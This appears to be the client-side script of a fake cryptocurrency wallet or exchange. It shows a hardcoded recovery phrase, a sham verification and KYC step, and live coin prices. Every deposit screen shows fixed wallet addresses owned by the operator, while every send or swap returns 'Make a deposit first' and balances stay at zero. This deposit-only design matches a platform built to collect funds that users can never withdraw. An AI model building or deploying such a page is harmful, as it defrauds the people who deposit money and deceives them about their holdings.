function goToMarketPage() {
    window.location.href = "index.html"; // Redirect to market.html
  }

  // Manually added secret phrase
  const secretWords = [
    "apple", "banana", "cherry", "date", "elderberry", "fig",
    "grape", "honeydew", "kiwi", "lemon", "mango", "nectarine"
  ];

  // Display the secret phrase
  document.getElementById('secret-words').textContent = secretWords.join(' ');

  // Copy secret phrase to clipboard
  function copySecretPhrase() {
    navigator.clipboard.writeText(secretWords.join(' ')).then(() => {
      alert('Secret phrase copied to clipboard!');
    });
  }

 // Show verify phase
function showVerifyPhase() {
document.getElementById('secret-phase').style.display = 'none';
document.getElementById('verify-phase').style.display = 'block';

// Randomly select 6 positions from the secret phrase
const selectedIndices = [];
while (selectedIndices.length < 6) {
  const randomIndex = Math.floor(Math.random() * 12);
  if (!selectedIndices.includes(randomIndex)) {
    selectedIndices.push(randomIndex);
  }
}

// Display instructions and input fields
const instructions = selectedIndices.map(index => `Word ${index + 1}`).join(', ');
document.getElementById('verify-instructions').textContent = `Enter the following words: ${instructions}`;

const verifyInputs = document.getElementById('verify-inputs');
verifyInputs.innerHTML = selectedIndices.map(index => `
  <input type="text" id="word-${index}" placeholder="Word ${index + 1}" style="font-size: 16px;">
`).join('');
}

 // Verify secret phrase
function verifySecretPhrase() {
const selectedIndices = Array.from(document.querySelectorAll('#verify-inputs input')).map(input => {
  const id = input.id.split('-')[1];
  return parseInt(id);
});

const valid = selectedIndices.every(index => {
  const enteredWord = document.getElementById(`word-${index}`).value;
  return enteredWord === secretWords[index];
});

if (valid) {
  localStorage.setItem('verified', 'true');
  const uid = generateUID(); // Generate UID with "UID-" prefix and 5-digit number
  localStorage.setItem('uid', uid); // Store UID in localStorage
  document.getElementById('verify-phase').style.display = 'none';
  document.getElementById('account-info').style.display = 'block';

  // Check KYC status (but do not show verify badge or UID yet)
  checkKYCStatus();
} else {
  alert('Invalid secret phrase!');
}
}

// Generate a unique UID with "UID-" prefix and 5-digit number
function generateUID() {
const randomNumber = Math.floor(10000 + Math.random() * 90000); // 5-digit number
return `UID-${randomNumber}`; // Format: UID-12345
}

  async function loadCryptos() {
const coins = [
  { id: 'bitcoin', symbol: 'btc', name: 'Bitcoin', logo: 'images/btc.png' },
  { id: 'ethereum', symbol: 'eth', name: 'Ethereum', logo: 'images/eth.png' },
  { id: 'tether', symbol: 'usdt', name: 'USDT', logo: 'images/usdt.png' },
  { id: 'binancecoin', symbol: 'bnb', name: 'Binance Coin', logo: 'images/bnb.png' },
  { id: 'solana', symbol: 'sol', name: 'Solana', logo: 'images/sol.png' },
  { id: 'tron', symbol: 'trx', name: 'TRON', logo: 'images/trx.png' },
  { id: 'ripple', symbol: 'xrp', name: 'Ripple', logo: 'images/xrp.png' },
  { id: 'cardano', symbol: 'ada', name: 'Cardano', logo: 'images/ada.png' },
  { id: 'bitcoin-cash', symbol: 'bch', name: 'Bitcoin Cash', logo: 'images/bch.png' },
  { id: 'dogecoin', symbol: 'doge', name: 'Dogecoin', logo: 'images/doge.png' },
  { id: 'polkadot', symbol: 'dot', name: 'Polkadot', logo: 'images/dot.png' },
  { id: 'uniswap', symbol: 'uni', name: 'Uniswap', logo: 'images/uni.png' },
  { id: 'chainlink', symbol: 'link', name: 'Chainlink', logo: 'images/link.png' },
  { id: 'litecoin', symbol: 'ltc', name: 'Litecoin', logo: 'images/ltc.png' },
  { id: 'polygon', symbol: 'matic', name: 'Polygon', logo: 'images/matic.png' },
  { id: 'stellar', symbol: 'xlm', name: 'Stellar', logo: 'images/xlm.png' },
  { id: 'vechain', symbol: 'vet', name: 'VeChain', logo: 'images/vet.png' },
  { id: 'ftx-token', symbol: 'ftt', name: 'FTX Token', logo: 'images/ftt.png' },
  { id: 'cosmos', symbol: 'atom', name: 'Cosmos', logo: 'images/atom.png' },
  { id: 'tezos', symbol: 'xtz', name: 'Tezos', logo: 'images/xtz.png' },
  { id: 'avalanche-2', symbol: 'avax', name: 'Avalanche', logo: 'images/avax.png' },
  { id: 'algorand', symbol: 'algo', name: 'Algorand', logo: 'images/algo.png' },
  { id: 'neo', symbol: 'neo', name: 'NEO', logo: 'images/neo.png' },
  { id: 'dash', symbol: 'dash', name: 'Dash', logo: 'images/dash.png' },
  { id: 'zcash', symbol: 'zec', name: 'Zcash', logo: 'images/zec.png' },
  { id: 'monero', symbol: 'xmr', name: 'Monero', logo: 'images/xmr.png' },
  { id: 'eos', symbol: 'eos', name: 'EOS', logo: 'images/eos.png' },
  { id: 'iota', symbol: 'iota', name: 'IOTA', logo: 'images/iota.png' },
  { id: 'waves', symbol: 'waves', name: 'Waves', logo: 'images/waves.png' },
  { id: 'hedera-hashgraph', symbol: 'hbar', name: 'Hedera', logo: 'images/hbar.png' },
  { id: 'internet-computer', symbol: 'icp', name: 'Internet Computer', logo: 'images/icp.png' },
  { id: 'theta-token', symbol: 'theta', name: 'Theta', logo: 'images/theta.png' },
  { id: 'filecoin', symbol: 'fil', name: 'Filecoin', logo: 'images/fil.png' },
  { id: 'klay-token', symbol: 'klay', name: 'Klaytn', logo: 'images/klay.png' },
  { id: 'zilliqa', symbol: 'zil', name: 'Zilliqa', logo: 'images/zil.png' },
  { id: 'enjincoin', symbol: 'enj', name: 'Enjin', logo: 'images/enj.png' },
  { id: 'basic-attention-token', symbol: 'bat', name: 'Basic Attention Token', logo: 'images/bat.png' },
  { id: 'decentraland', symbol: 'mana', name: 'Decentraland', logo: 'images/mana.png' },
  { id: 'the-sandbox', symbol: 'sand', name: 'The Sandbox', logo: 'images/sand.png' }
];

const coinsElement = document.getElementById('coins');
coinsElement.innerHTML = '';

// Fetch all coins in a single API call to avoid rate limits
const coinIds = coins.map(coin => coin.id).join(',');
try {
  const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinIds}&vs_currencies=usd&include_24hr_change=true`);
  if (!response.ok) throw new Error('Failed to fetch data');
  const data = await response.json();

  coins.forEach(coin => {
    const price = data[coin.id]?.usd || 'N/A';
    const change = data[coin.id]?.usd_24h_change || 0;

    // Add balance section for each coin
    const usdBalance = 0.00; // Default USD balance
    const coinBalance = 0.00; // Default coin balance

    coinsElement.innerHTML += `
      <div class="coin" onclick="showCryptoActions('${coin.name}', '${coin.symbol}')">
        <div class="left-side">
          <img src="${coin.logo}" alt="${coin.name}" onerror="this.src='https://via.placeholder.com/50';">
          <div class="coin-info">
            <p class="coin-name">${coin.name} (${coin.symbol.toUpperCase()})</p>
            <p class="coin-price">$${price}</p>
          </div>
        </div>
        <div class="right-side">
          <p class="change ${change >= 0 ? 'positive' : 'negative'}">${change.toFixed(2)}%</p>
          <p class="balance">$${usdBalance.toFixed(2)}</p>
          <p class="coin-balance">${coinBalance.toFixed(2)} ${coin.symbol.toUpperCase()}</p>
        </div>
      </div>
    `;
  });
} catch (error) {
  console.error('Error fetching crypto data:', error);
  coinsElement.innerHTML = '<p>Failed to load cryptocurrencies. Please try again later.</p>';
}
}

  // Filter cryptos based on search input
  function filterCryptos() {
    const searchTerm = document.getElementById('search-crypto').value.toLowerCase();
    const coins = document.querySelectorAll('.crypto-list .coin');
    coins.forEach(coin => {
      const name = coin.querySelector('p').textContent.toLowerCase();
      if (name.includes(searchTerm)) {
        coin.style.display = 'block';
      } else {
        coin.style.display = 'none';
      }
    });
  }

  // Show crypto actions (Send, Receive, Swap)
  function showCryptoActions(name, symbol) {
    document.getElementById('crypto-list').style.display = 'none';
    document.getElementById('crypto-actions').style.display = 'block';
    document.getElementById('crypto-name').textContent = name;
    currentCrypto = { name, symbol };
  }

  // Show crypto list
  function showCryptoList() {
    document.getElementById('crypto-actions').style.display = 'none';
    document.getElementById('send-section').style.display = 'none';
    document.getElementById('receive-section').style.display = 'none';
    document.getElementById('swap-section').style.display = 'none';
    document.getElementById('crypto-list').style.display = 'block';
  }

  // Show send section
  function showSendSection() {
    document.getElementById('crypto-actions').style.display = 'none';
    document.getElementById('send-section').style.display = 'block';
    document.getElementById('send-crypto-name').textContent = currentCrypto.name;
    document.getElementById('send-crypto-logo').src = `images/${currentCrypto.symbol}.png`;
  }

  // Send crypto
  function sendCrypto() {
    const amount = document.getElementById('send-amount').value;
    const address = document.getElementById('send-address').value;

    if (!amount || !address) {
      alert('Please fill the fields.');
      return;
    }

    alert('Make a deposit first.');
  }

  // Show receive section
  function showReceiveSection() {
    document.getElementById('crypto-actions').style.display = 'none';
    document.getElementById('receive-section').style.display = 'block';
    document.getElementById('receive-crypto-name').textContent = currentCrypto.name;
    document.getElementById('receive-crypto-logo').src = `images/${currentCrypto.symbol}.png`;

    const depositAddresses = {
      btc: 'bc1qn7my6uc0rklg0qwsf0s4azc4z3gfyf6rgk74qa',
      eth: '0x1123201B89fAC2F1F5888e8DBAe3870a5156F9b4',
      bnb: '0x0469247ed01405c71e47ad864a604b73a63a2f4c',
      ada: 'addr1q8edf3qda6ax6ag79yg9yrnme47y9mc3u8dyuvzwka4a4pw7xmphu062rnmgv3lpk7hynjmnq6ycahup9l0wy5ph87dseel9yh',
      sol: '3Mk4ax7hifVCUr6n3ieGE2kyYcE2XxAjgHCXtzLt5Qmc',
      xrp: 'rLsrCHUCKPLVxpTrzgtZbc9FzVZ2zfLQhr',
      doge: 'D6ztrS2ciUkpbX3MDtwKbT2dNKdkyvzeFx',
      dot: '13EGQQh4mBYd2NJoh1e7scG8GSZgJnj4VhHrCzh5pUCYqBnW',
      uni: 'UniswapAddress...',
      link: 'ChainlinkAddress...',
      ltc: 'ltc1qsrz4uftpf4a8gtc4y6j56ex6e42ap26d9fktwy',
      bch: 'qqwmyneqz2lzqmjc7zaxmtqmdchfu2xuvsg9n0zjgr',
      matic: 'PolygonAddress...',
      xlm: 'StellarAddress...',
      vet: 'VeChainAddress...',
      trx: 'TUXYoH13wPv24GJoMqHKvqtyvzjQHCBQor',
      ftt: 'FTXTokenAddress...',
      atom: 'CosmosAddress...',
      xtz: 'TezosAddress...',
      usdt: 'TUXYoH13wPv24GJoMqHKvqtyvzjQHCBQor',
      avax: 'AvalancheAddress...',
      algo: 'AlgorandAddress...',
      neo: 'NEOAddress...',
      dash: 'DashAddress...',
      zec: 'ZcashAddress...',
      xmr: 'MoneroAddress...',
      eos: 'EOSAddress...',
      iota: 'IOTAAddress...',
      waves: 'WavesAddress...',
      hbar: 'HederaAddress...',
      icp: 'InternetComputerAddress...',
      theta: 'ThetaAddress...',
      fil: 'FilecoinAddress...',
      klay: 'KlaytnAddress...',
      zil: 'ZilliqaAddress...',
      enj: 'EnjinAddress...',
      bat: 'BasicAttentionTokenAddress...',
      mana: 'DecentralandAddress...',
      sand: 'TheSandboxAddress...'
    };

    document.getElementById('deposit-address').textContent = depositAddresses[currentCrypto.symbol];
    document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${depositAddresses[currentCrypto.symbol]}`;
  }

  // Copy deposit address
  function copyAddress() {
    const address = document.getElementById('deposit-address').textContent;
    navigator.clipboard.writeText(address).then(() => {
      alert('Address copied to clipboard!');
    });
  }

  // Show swap section
  function showSwapSection() {
    document.getElementById('crypto-actions').style.display = 'none';
    document.getElementById('swap-section').style.display = 'block';
    document.getElementById('swap-from-logo').src = `images/${document.getElementById('swap-from').value}.png`;
    document.getElementById('swap-to-logo').src = `images/${document.getElementById('swap-to').value}.png`;
  }

  // Swap crypto
  function swapCrypto() {
    const amount = document.getElementById('swap-amount').value;

    if (!amount) {
      alert('Please fill the fields.');
      return;
    }

    alert('Make a deposit first.');
  }

  // Swap direction
  function swapDirection() {
    const from = document.getElementById('swap-from').value;
    const to = document.getElementById('swap-to').value;
    document.getElementById('swap-from').value = to;
    document.getElementById('swap-to').value = from;
    document.getElementById('swap-from-logo').src = `images/${to}.png`;
    document.getElementById('swap-to-logo').src = `images/${from}.png`;
  }

  // Upload profile image
  function uploadImage() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.onchange = (event) => {
      const file = event.target.files[0];
      const reader = new FileReader();
      reader.onload = (e) => {
        document.getElementById('profile-icon').src = e.target.result;
      };
      reader.readAsDataURL(file);
    };
    input.click();
  }

  // Back button functionality for all sections
  function goBackToCryptoActions() {
    document.getElementById('send-section').style.display = 'none';
    document.getElementById('receive-section').style.display = 'none';
    document.getElementById('swap-section').style.display = 'none';
    document.getElementById('crypto-actions').style.display = 'block';
  }

// Check KYC status and update UI
function checkKYCStatus() {
if (localStorage.getItem('kycVerified') === 'true') {
  // Add verified badge under the profile icon
  const profileIcon = document.getElementById('profile-icon');
  const verifiedBadge = document.createElement('div');
  verifiedBadge.className = 'verified-badge';
  verifiedBadge.textContent = 'Verified';
  profileIcon.parentNode.insertBefore(verifiedBadge, profileIcon.nextSibling);

  // Display UID
  const uid = localStorage.getItem('uid');
  document.getElementById('uid').textContent = `UID: ${uid}`;

  // Remove KYC button
  const kycButton = document.getElementById('kyc-button');
  if (kycButton) {
    kycButton.style.display = 'none';
  }

  // Load cryptos only after both secret phrase and KYC are verified
  loadCryptos();
}
}
  // Apply saved theme
  const savedTheme = localStorage.getItem('theme');
  if (savedTheme === 'light') {
    document.body.classList.add('light-theme');
  }

  let currentCrypto = {};

 // Check if already verified and KYC is completed on page load
if (localStorage.getItem('verified') === 'true' && localStorage.getItem('kycVerified') === 'true') {
document.getElementById('secret-phase').style.display = 'none';
document.getElementById('account-info').style.display = 'block';

// Add verified badge and display UID
const profileIcon = document.getElementById('profile-icon');
const verifiedBadge = document.createElement('div');
verifiedBadge.className = 'verified-badge';
verifiedBadge.textContent = 'Verified';
profileIcon.parentNode.insertBefore(verifiedBadge, profileIcon.nextSibling);

const uid = localStorage.getItem('uid');
document.getElementById('uid').textContent = `UID: ${uid}`;

// Remove KYC button
const kycButton = document.getElementById('kyc-button');
if (kycButton) {
  kycButton.style.display = 'none';
}

// Load cryptos
loadCryptos();
} else if (localStorage.getItem('verified') === 'true') {
// If only secret phrase is verified, show account info but not verify badge or UID
document.getElementById('secret-phase').style.display = 'none';
document.getElementById('account-info').style.display = 'block';
}
// Function to populate a table
function populateTable(tableId, data) {
    const tableBody = document.querySelector(`#${tableId} tbody`);
    tableBody.innerHTML = data
      .map(
        (row) => `
      <tr>
        <td>
          <div class="coin-info">
            <img src="${row.logo}" class="coin-logo" alt="${row.name} Logo">
            <div class="coin-details">
              <span class="coin-name">${row.name}</span>
              <span class="coin-symbol">${row.symbol || ""}</span>
            </div>
          </div>
        </td>
        <td>${row.price}</td>
        <td class="${row.change.includes("+") ? "positive" : "negative"}">${row.change}</td>
        <td>${row.marketCap}</td>
        <td>
          <div class="small-graph">
            <svg>
              <path class="sparkline ${row.sparkline}" d="M0,30 L20,10 L40,20 L60,5 L80,25"></path>
            </svg>
          </div>
        </td>
      </tr>
    `
      )
      .join("");
  }